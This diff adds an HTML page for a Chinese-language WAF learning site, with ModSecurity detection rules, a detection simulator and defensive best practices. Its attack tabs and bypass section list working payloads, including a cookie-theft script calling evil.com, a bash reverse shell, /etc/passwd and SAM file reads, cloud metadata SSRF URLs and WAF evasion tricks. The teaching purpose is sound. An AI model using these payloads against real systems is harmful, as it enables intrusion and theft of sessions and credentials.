@@ -1,0 +1,1362 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>What The WAF - WAF 學習平台</title>
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --bg-dark: #0f172a;
+            --bg-card: #1e293b;
+            --bg-code: #334155;
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --border: #334155;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+
+        /* Navigation */
+        nav {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            z-index: 1000;
+            padding: 1rem 2rem;
+        }
+
+        nav .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 8rem 2rem 4rem;
+            text-align: center;
+            background: linear-gradient(135deg, var(--bg-dark) 0%, #1a1a2e 100%);
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: 1.25rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto 2rem;
+        }
+
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Section */
+        section {
+            padding: 4rem 0;
+        }
+
+        section h2 {
+            font-size: 2rem;
+            margin-bottom: 2rem;
+            color: var(--text-primary);
+            border-left: 4px solid var(--primary);
+            padding-left: 1rem;
+        }
+
+        /* Cards */
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .card {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 1.5rem;
+            border: 1px solid var(--border);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 40px rgba(99, 102, 241, 0.2);
+        }
+
+        .card h3 {
+            color: var(--primary);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .card p {
+            color: var(--text-secondary);
+        }
+
+        /* Attack Types */
+        .attack-badge {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.875rem;
+            margin-bottom: 1rem;
+        }
+
+        .badge-critical {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+        }
+
+        .badge-high {
+            background: rgba(245, 158, 11, 0.2);
+            color: var(--warning);
+        }
+
+        .badge-medium {
+            background: rgba(99, 102, 241, 0.2);
+            color: var(--primary);
+        }
+
+        /* Code Block */
+        .code-block {
+            background: var(--bg-code);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            overflow-x: auto;
+            font-family: 'Monaco', 'Menlo', monospace;
+            font-size: 0.875rem;
+            border: 1px solid var(--border);
+        }
+
+        .code-block code {
+            color: #e2e8f0;
+        }
+
+        .code-comment {
+            color: #6b7280;
+        }
+
+        .code-keyword {
+            color: var(--primary);
+        }
+
+        .code-string {
+            color: var(--secondary);
+        }
+
+        .code-danger {
+            color: var(--danger);
+        }
+
+        /* Interactive Quiz */
+        .quiz-container {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 2rem;
+            border: 1px solid var(--border);
+        }
+
+        .quiz-question {
+            margin-bottom: 1.5rem;
+        }
+
+        .quiz-question h4 {
+            margin-bottom: 1rem;
+            color: var(--text-primary);
+        }
+
+        .quiz-input {
+            width: 100%;
+            padding: 1rem;
+            background: var(--bg-code);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-family: monospace;
+            margin-bottom: 1rem;
+        }
+
+        .quiz-options {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .quiz-option {
+            padding: 1rem;
+            background: var(--bg-code);
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            color: var(--text-primary);
+        }
+
+        .quiz-option:hover {
+            border-color: var(--primary);
+        }
+
+        .quiz-option.correct {
+            border-color: var(--secondary);
+            background: rgba(16, 185, 129, 0.1);
+        }
+
+        .quiz-option.incorrect {
+            border-color: var(--danger);
+            background: rgba(239, 68, 68, 0.1);
+        }
+
+        .btn {
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-dark);
+        }
+
+        .btn-secondary {
+            background: var(--bg-code);
+            color: var(--text-primary);
+            border: 1px solid var(--border);
+        }
+
+        .result-box {
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            display: none;
+        }
+
+        .result-box.show {
+            display: block;
+        }
+
+        .result-success {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid var(--secondary);
+            color: var(--secondary);
+        }
+
+        .result-error {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--danger);
+            color: var(--danger);
+        }
+
+        /* WAF Rule Demo */
+        .rule-demo {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-top: 1.5rem;
+            border: 1px solid var(--border);
+        }
+
+        .rule-input-group {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .rule-input-group input {
+            flex: 1;
+            padding: 0.75rem 1rem;
+            background: var(--bg-code);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-family: monospace;
+        }
+
+        .detection-result {
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+        }
+
+        .detection-blocked {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--danger);
+        }
+
+        .detection-allowed {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid var(--secondary);
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .tab {
+            padding: 0.75rem 1.5rem;
+            background: var(--bg-code);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            cursor: pointer;
+            color: var(--text-secondary);
+            transition: all 0.3s;
+        }
+
+        .tab:hover {
+            color: var(--text-primary);
+        }
+
+        .tab.active {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Accordion */
+        .accordion {
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 1rem;
+        }
+
+        .accordion-header {
+            padding: 1rem 1.5rem;
+            background: var(--bg-card);
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.3s;
+        }
+
+        .accordion-header:hover {
+            background: var(--bg-code);
+        }
+
+        .accordion-header h4 {
+            color: var(--text-primary);
+        }
+
+        .accordion-icon {
+            transition: transform 0.3s;
+        }
+
+        .accordion.active .accordion-icon {
+            transform: rotate(180deg);
+        }
+
+        .accordion-content {
+            padding: 0 1.5rem;
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.3s;
+            background: var(--bg-card);
+        }
+
+        .accordion.active .accordion-content {
+            padding: 1.5rem;
+            max-height: 2000px;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            margin-bottom: 2rem;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: var(--bg-code);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border-radius: 4px;
+            transition: width 0.5s;
+        }
+
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 0.5rem;
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--bg-card);
+            padding: 3rem 2rem;
+            text-align: center;
+            border-top: 1px solid var(--border);
+        }
+
+        footer p {
+            color: var(--text-secondary);
+        }
+
+        footer a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+
+            .rule-input-group {
+                flex-direction: column;
+            }
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .animate-in {
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-dark);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary);
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav>
+        <div class="container">
+            <div class="logo">🛡️ What The WAF</div>
+            <ul class="nav-links">
+                <li><a href="#intro">介紹</a></li>
+                <li><a href="#attacks">攻擊類型</a></li>
+                <li><a href="#rules">WAF 規則</a></li>
+                <li><a href="#bypass">繞過技術</a></li>
+                <li><a href="#quiz">實戰練習</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <h1>What The WAF</h1>
+        <p>深入了解 Web Application Firewall 的運作原理，學習如何保護您的網站應用程式免受常見攻擊</p>
+        <a href="#intro" class="btn btn-primary">開始學習</a>
+    </section>
+
+    <div class="container">
+        <!-- Introduction Section -->
+        <section id="intro">
+            <h2>什麼是 WAF？</h2>
+            <div class="card-grid">
+                <div class="card">
+                    <h3>📋 定義</h3>
+                    <p>Web Application Firewall (WAF) 是一種應用層防火牆，專門用於監控、過濾和阻止進出 Web 應用程式的 HTTP/HTTPS 流量。</p>
+                </div>
+                <div class="card">
+                    <h3>🎯 目的</h3>
+                    <p>WAF 主要目的是保護 Web 應用程式免受常見的攻擊，如 SQL Injection、XSS、CSRF 等 OWASP Top 10 威脅。</p>
+                </div>
+                <div class="card">
+                    <h3>⚙️ 運作方式</h3>
+                    <p>WAF 透過預定義的規則集或機器學習模型來分析 HTTP 請求，識別並阻止惡意流量。</p>
+                </div>
+            </div>
+
+            <div class="rule-demo" style="margin-top: 2rem;">
+                <h3 style="margin-bottom: 1rem;">WAF 架構示意</h3>
+                <div class="code-block">
+                    <code>
+┌─────────┐     ┌─────────┐     ┌─────────────┐     ┌──────────┐
+│  User   │────▶│   WAF   │────▶│ Web Server  │────▶│ Database │
+└─────────┘     └─────────┘     └─────────────┘     └──────────┘
+                     │
+                     ▼
+              ┌─────────────┐
+              │ Rule Engine │
+              │ ─────────── │
+              │ • Signatures│
+              │ • Regex     │
+              │ • ML Model  │
+              └─────────────┘
+                    </code>
+                </div>
+            </div>
+        </section>
+
+        <!-- Attack Types Section -->
+        <section id="attacks">
+            <h2>常見攻擊類型</h2>
+
+            <div class="tabs">
+                <button class="tab active" data-tab="sqli">SQL Injection</button>
+                <button class="tab" data-tab="xss">XSS</button>
+                <button class="tab" data-tab="rce">Command Injection</button>
+                <button class="tab" data-tab="path">Path Traversal</button>
+                <button class="tab" data-tab="ssrf">SSRF</button>
+            </div>
+
+            <!-- SQL Injection -->
+            <div class="tab-content active" id="sqli">
+                <div class="card">
+                    <span class="attack-badge badge-critical">嚴重</span>
+                    <h3>💉 SQL Injection (SQL 注入)</h3>
+                    <p>攻擊者透過在輸入欄位中注入惡意 SQL 程式碼，來操控後端資料庫。</p>
+
+                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment">-- 基本認證繞過</span>
+<span class="code-danger">' OR '1'='1</span>
+<span class="code-danger">' OR 1=1--</span>
+<span class="code-danger">admin'--</span>
+
+<span class="code-comment">-- Union 攻擊</span>
+<span class="code-danger">' UNION SELECT username, password FROM users--</span>
+
+<span class="code-comment">-- 時間盲注</span>
+<span class="code-danger">' AND SLEEP(5)--</span>
+<span class="code-danger">' AND IF(1=1, SLEEP(5), 0)--</span>
+
+<span class="code-comment">-- 堆疊查詢</span>
+<span class="code-danger">'; DROP TABLE users;--</span>
+                        </code>
+                    </div>
+
+                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF 偵測規則範例：</h4>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># ModSecurity 規則範例</span>
+SecRule ARGS <span class="code-string">"(?i)(union.*select|select.*from|insert.*into|delete.*from|drop\s+table)"</span> \
+    <span class="code-keyword">"id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"</span>
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- XSS -->
+            <div class="tab-content" id="xss">
+                <div class="card">
+                    <span class="attack-badge badge-high">高風險</span>
+                    <h3>🔓 Cross-Site Scripting (XSS)</h3>
+                    <p>攻擊者將惡意腳本注入到網頁中，當其他用戶瀏覽該頁面時執行。</p>
+
+                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment">// Reflected XSS</span>
+<span class="code-danger">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+<span class="code-danger">&lt;img src=x onerror=alert('XSS')&gt;</span>
+
+<span class="code-comment">// DOM-based XSS</span>
+<span class="code-danger">&lt;svg onload=alert('XSS')&gt;</span>
+<span class="code-danger">&lt;body onpageshow=alert('XSS')&gt;</span>
+
+<span class="code-comment">// Cookie 竊取</span>
+<span class="code-danger">&lt;script&gt;new Image().src='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="code-comment">// 事件處理器</span>
+<span class="code-danger">&lt;div onmouseover="alert('XSS')"&gt;Hover me&lt;/div&gt;</span>
+                        </code>
+                    </div>
+
+                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF 偵測規則範例：</h4>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># 偵測 script 標籤和事件處理器</span>
+SecRule ARGS <span class="code-string">"(?i)(&lt;script|javascript:|on\w+\s*=)"</span> \
+    <span class="code-keyword">"id:1002,phase:2,deny,status:403,msg:'XSS Attack Detected'"</span>
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Command Injection -->
+            <div class="tab-content" id="rce">
+                <div class="card">
+                    <span class="attack-badge badge-critical">嚴重</span>
+                    <h3>💻 Command Injection (命令注入)</h3>
+                    <p>攻擊者透過注入系統命令，在伺服器上執行任意程式碼。</p>
+
+                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># 命令串接</span>
+<span class="code-danger">; ls -la</span>
+<span class="code-danger">| cat /etc/passwd</span>
+<span class="code-danger">&& whoami</span>
+
+<span class="code-comment"># 命令替換</span>
+<span class="code-danger">`id`</span>
+<span class="code-danger">$(whoami)</span>
+
+<span class="code-comment"># 反彈 Shell</span>
+<span class="code-danger">; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</span>
+                        </code>
+                    </div>
+
+                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF 偵測規則範例：</h4>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># 偵測常見命令注入模式</span>
+SecRule ARGS <span class="code-string">"(?i)(;|\||&&|\$\(|`).*(cat|ls|whoami|id|passwd|shadow)"</span> \
+    <span class="code-keyword">"id:1003,phase:2,deny,status:403,msg:'Command Injection Detected'"</span>
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Path Traversal -->
+            <div class="tab-content" id="path">
+                <div class="card">
+                    <span class="attack-badge badge-high">高風險</span>
+                    <h3>📁 Path Traversal (路徑穿越)</h3>
+                    <p>攻擊者透過操作檔案路徑來存取伺服器上未授權的檔案。</p>
+
+                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># 基本路徑穿越</span>
+<span class="code-danger">../../../etc/passwd</span>
+<span class="code-danger">....//....//....//etc/passwd</span>
+
+<span class="code-comment"># URL 編碼</span>
+<span class="code-danger">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</span>
+<span class="code-danger">..%252f..%252f..%252fetc/passwd</span>
+
+<span class="code-comment"># Null Byte</span>
+<span class="code-danger">../../../etc/passwd%00.jpg</span>
+
+<span class="code-comment"># Windows 路徑</span>
+<span class="code-danger">..\..\..\windows\system32\config\sam</span>
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SSRF -->
+            <div class="tab-content" id="ssrf">
+                <div class="card">
+                    <span class="attack-badge badge-high">高風險</span>
+                    <h3>🌐 Server-Side Request Forgery (SSRF)</h3>
+                    <p>攻擊者誘導伺服器向內部網路或其他服務發送請求。</p>
+
+                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">攻擊範例：</h4>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># 存取內部服務</span>
+<span class="code-danger">http://localhost:8080/admin</span>
+<span class="code-danger">http://127.0.0.1:3306/</span>
+
+<span class="code-comment"># 存取雲端元資料</span>
+<span class="code-danger">http://169.254.169.254/latest/meta-data/</span>
+<span class="code-danger">http://metadata.google.internal/</span>
+
+<span class="code-comment"># 繞過技術</span>
+<span class="code-danger">http://0.0.0.0:8080/</span>
+<span class="code-danger">http://[::]:8080/</span>
+<span class="code-danger">http://127.1/</span>
+                        </code>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- WAF Rules Section -->
+        <section id="rules">
+            <h2>WAF 規則設計</h2>
+
+            <div class="accordion">
+                <div class="accordion-header" onclick="toggleAccordion(this)">
+                    <h4>正則表達式基礎</h4>
+                    <span class="accordion-icon">▼</span>
+                </div>
+                <div class="accordion-content">
+                    <p>WAF 規則大量使用正則表達式來匹配惡意模式：</p>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># 常用 Regex 元字符</span>
+.       <span class="code-comment"># 匹配任意字符</span>
+*       <span class="code-comment"># 匹配前一個字符 0 次或多次</span>
++       <span class="code-comment"># 匹配前一個字符 1 次或多次</span>
+?       <span class="code-comment"># 匹配前一個字符 0 次或 1 次</span>
+\s      <span class="code-comment"># 匹配空白字符</span>
+\w      <span class="code-comment"># 匹配字母數字字符</span>
+(?i)    <span class="code-comment"># 大小寫不敏感</span>
+|       <span class="code-comment"># 或運算符</span>
+
+<span class="code-comment"># SQL 注入偵測範例</span>
+<span class="code-string">(?i)(union\s+select|select\s+.*\s+from)</span>
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <div class="accordion">
+                <div class="accordion-header" onclick="toggleAccordion(this)">
+                    <h4>ModSecurity 規則語法</h4>
+                    <span class="accordion-icon">▼</span>
+                </div>
+                <div class="accordion-content">
+                    <p>ModSecurity 是最流行的開源 WAF 引擎：</p>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># 規則基本結構</span>
+SecRule <span class="code-keyword">VARIABLE</span> <span class="code-string">"OPERATOR"</span> <span class="code-keyword">"ACTIONS"</span>
+
+<span class="code-comment"># 範例：阻擋 SQL 注入</span>
+SecRule ARGS <span class="code-string">"(?i)union.*select"</span> \
+    <span class="code-keyword">"id:1001,\
+     phase:2,\
+     deny,\
+     status:403,\
+     log,\
+     msg:'SQL Injection Attack'"</span>
+
+<span class="code-comment"># 常用變數</span>
+ARGS            <span class="code-comment"># 所有請求參數</span>
+REQUEST_URI     <span class="code-comment"># 請求 URI</span>
+REQUEST_BODY    <span class="code-comment"># 請求主體</span>
+REQUEST_HEADERS <span class="code-comment"># 請求標頭</span>
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <div class="accordion">
+                <div class="accordion-header" onclick="toggleAccordion(this)">
+                    <h4>OWASP CRS (Core Rule Set)</h4>
+                    <span class="accordion-icon">▼</span>
+                </div>
+                <div class="accordion-content">
+                    <p>OWASP CRS 是一組通用的 WAF 規則集：</p>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># 規則類別</span>
+REQUEST-911-METHOD-ENFORCEMENT    <span class="code-comment"># HTTP 方法限制</span>
+REQUEST-913-SCANNER-DETECTION     <span class="code-comment"># 掃描器偵測</span>
+REQUEST-920-PROTOCOL-ENFORCEMENT  <span class="code-comment"># 協議規範</span>
+REQUEST-930-APPLICATION-ATTACK-LFI <span class="code-comment"># LFI 攻擊</span>
+REQUEST-931-APPLICATION-ATTACK-RFI <span class="code-comment"># RFI 攻擊</span>
+REQUEST-932-APPLICATION-ATTACK-RCE <span class="code-comment"># RCE 攻擊</span>
+REQUEST-933-APPLICATION-ATTACK-PHP <span class="code-comment"># PHP 攻擊</span>
+REQUEST-941-APPLICATION-ATTACK-XSS <span class="code-comment"># XSS 攻擊</span>
+REQUEST-942-APPLICATION-ATTACK-SQLI <span class="code-comment"># SQL 注入</span>
+                        </code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Interactive WAF Demo -->
+            <div class="rule-demo">
+                <h3 style="margin-bottom: 1rem;">🔍 WAF 即時偵測模擬器</h3>
+                <p style="color: var(--text-secondary); margin-bottom: 1rem;">輸入一段 payload 來測試 WAF 是否會偵測到攻擊：</p>
+
+                <div class="rule-input-group">
+                    <input type="text" id="waf-input" placeholder="輸入測試 payload，例如：' OR 1=1--">
+                    <button class="btn btn-primary" onclick="checkWAF()">檢測</button>
+                </div>
+
+                <div id="waf-result"></div>
+
+                <div style="margin-top: 1rem;">
+                    <p style="color: var(--text-secondary); font-size: 0.875rem;">快速測試：</p>
+                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 0.5rem;">
+                        <button class="btn btn-secondary" onclick="setPayload(`' OR '1'='1`)">SQLi 基本</button>
+                        <button class="btn btn-secondary" onclick="setPayload(`<script>alert(1)</script>`)">XSS 基本</button>
+                        <button class="btn btn-secondary" onclick="setPayload(`; cat /etc/passwd`)">命令注入</button>
+                        <button class="btn btn-secondary" onclick="setPayload(`../../../etc/passwd`)">路徑穿越</button>
+                        <button class="btn btn-secondary" onclick="setPayload(`hello world`)">正常輸入</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Bypass Techniques -->
+        <section id="bypass">
+            <h2>WAF 繞過技術</h2>
+            <p style="color: var(--text-secondary); margin-bottom: 2rem;">了解攻擊者如何嘗試繞過 WAF，有助於設計更強健的防護規則。</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h3>🔤 大小寫變換</h3>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># 原始</span>
+UNION SELECT
+
+<span class="code-comment"># 繞過嘗試</span>
+<span class="code-danger">UnIoN SeLeCt</span>
+<span class="code-danger">uNiOn sElEcT</span>
+                        </code>
+                    </div>
+                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
+                        <strong>防護：</strong>使用 (?i) 標記進行大小寫不敏感匹配
+                    </p>
+                </div>
+
+                <div class="card">
+                    <h3>📝 編碼繞過</h3>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># URL 編碼</span>
+<span class="code-danger">%27%20OR%20%271%27=%271</span>
+
+<span class="code-comment"># 雙重編碼</span>
+<span class="code-danger">%252f%252e%252e</span>
+
+<span class="code-comment"># Unicode</span>
+<span class="code-danger">%u0027</span>
+                        </code>
+                    </div>
+                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
+                        <strong>防護：</strong>在檢測前進行多層解碼
+                    </p>
+                </div>
+
+                <div class="card">
+                    <h3>💭 註解插入</h3>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># SQL 註解</span>
+<span class="code-danger">UN/**/ION/**/SEL/**/ECT</span>
+<span class="code-danger">UNION/*!50000SELECT*/</span>
+
+<span class="code-comment"># HTML 註解</span>
+<span class="code-danger">&lt;scr&lt;!--test--&gt;ipt&gt;</span>
+                        </code>
+                    </div>
+                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
+                        <strong>防護：</strong>移除註解後再進行檢測
+                    </p>
+                </div>
+
+                <div class="card">
+                    <h3>⬜ 空白字符變換</h3>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># Tab 代替空格</span>
+<span class="code-danger">UNION[TAB]SELECT</span>
+
+<span class="code-comment"># 換行符</span>
+<span class="code-danger">UNION%0aSELECT</span>
+
+<span class="code-comment"># 多個空格</span>
+<span class="code-danger">UNION    SELECT</span>
+                        </code>
+                    </div>
+                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
+                        <strong>防護：</strong>使用 \s+ 匹配任意空白字符
+                    </p>
+                </div>
+
+                <div class="card">
+                    <h3>🔄 同義詞替換</h3>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># OR 的替代</span>
+<span class="code-danger">|| (管道符)</span>
+
+<span class="code-comment"># 空格替代</span>
+<span class="code-danger">UNION+SELECT</span>
+
+<span class="code-comment"># 函數替代</span>
+<span class="code-danger">CHAR(39) 代替 '</span>
+                        </code>
+                    </div>
+                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
+                        <strong>防護：</strong>規則涵蓋各種同義表達
+                    </p>
+                </div>
+
+                <div class="card">
+                    <h3>📦 參數污染</h3>
+                    <div class="code-block">
+                        <code>
+<span class="code-comment"># HPP (HTTP Parameter Pollution)</span>
+<span class="code-danger">?id=1&id=UNION&id=SELECT</span>
+
+<span class="code-comment"># 不同服務器處理方式</span>
+Apache: 取最後一個
+IIS: 合併所有
+Tomcat: 取第一個
+                        </code>
+                    </div>
+                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
+                        <strong>防護：</strong>檢測所有重複參數
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Interactive Quiz Section -->
+        <section id="quiz">
+            <h2>實戰練習</h2>
+
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="quiz-progress" style="width: 0%"></div>
+                </div>
+                <div class="progress-text">
+                    <span>進度</span>
+                    <span id="quiz-score">0 / 5</span>
+                </div>
+            </div>
+
+            <div class="quiz-container">
+                <div id="quiz-content">
+                    <!-- Quiz questions will be loaded here -->
+                </div>
+                <div style="display: flex; gap: 1rem; margin-top: 1.5rem;">
+                    <button class="btn btn-secondary" id="prev-btn" onclick="prevQuestion()" disabled>上一題</button>
+                    <button class="btn btn-primary" id="next-btn" onclick="nextQuestion()">下一題</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Best Practices -->
+        <section id="best-practices">
+            <h2>WAF 最佳實踐</h2>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h3>✅ 分層防禦</h3>
+                    <p>WAF 只是防線之一，應結合輸入驗證、參數化查詢、CSP 等多層防護。</p>
+                </div>
+                <div class="card">
+                    <h3>📊 監控與日誌</h3>
+                    <p>持續監控 WAF 日誌，分析攻擊模式，並調整規則以減少誤報。</p>
+                </div>
+                <div class="card">
+                    <h3>🔄 定期更新</h3>
+                    <p>保持 WAF 規則集更新，以應對新型攻擊技術。</p>
+                </div>
+                <div class="card">
+                    <h3>🧪 測試驗證</h3>
+                    <p>在部署前進行充分測試，確保規則不會影響正常業務流量。</p>
+                </div>
+                <div class="card">
+                    <h3>⚖️ 平衡安全與可用性</h3>
+                    <p>規則過於嚴格會導致誤報，過於寬鬆則無法有效防護，需找到平衡點。</p>
+                </div>
+                <div class="card">
+                    <h3>🎯 自訂規則</h3>
+                    <p>根據應用程式特性，自訂專屬規則以提供更精準的保護。</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Resources -->
+        <section id="resources">
+            <h2>延伸資源</h2>
+            <div class="card">
+                <h3>📚 推薦學習資源</h3>
+                <ul style="color: var(--text-secondary); margin-top: 1rem; padding-left: 1.5rem;">
+                    <li style="margin-bottom: 0.5rem;"><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" style="color: var(--primary);">OWASP Web Security Testing Guide</a></li>
+                    <li style="margin-bottom: 0.5rem;"><a href="https://owasp.org/www-project-modsecurity-core-rule-set/" target="_blank" style="color: var(--primary);">OWASP ModSecurity Core Rule Set</a></li>
+                    <li style="margin-bottom: 0.5rem;"><a href="https://portswigger.net/web-security" target="_blank" style="color: var(--primary);">PortSwigger Web Security Academy</a></li>
+                    <li style="margin-bottom: 0.5rem;"><a href="https://github.com/payloadbox" target="_blank" style="color: var(--primary);">PayloadBox - Payload 收集</a></li>
+                </ul>
